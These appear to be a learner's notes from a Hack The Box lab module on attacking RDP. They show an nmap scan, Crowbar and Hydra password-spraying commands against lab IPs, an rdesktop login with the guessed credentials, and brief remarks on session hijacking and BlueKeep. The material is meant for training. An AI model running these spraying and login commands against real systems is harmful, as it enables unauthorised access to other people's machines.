# Attacking RDP
## Enumeration

```bash
Yashfren@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE

```

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. 

```bash
Yashfren@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

#### Crowbar - RDP Password Spraying

```bash
Yashfren@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1

2022-04-07 15:35:52 STOP
```

We can also use `Hydra` to perform an RDP password spray attack.
#### Hydra - RDP Password Spraying

```bash
Yashfren@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.

```

We can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.
#### RDP Login

```bash
Yashfren@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```
## Protocol Specific Attacks

Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.


# Latest RDP Vulnerabilities

---

In 2019, a critical vulnerability was published in the RDP (`TCP/3389`) service that also led to remote code execution (`RCE`) with the identifier [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). This vulnerability is known as `BlueKeep`. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.
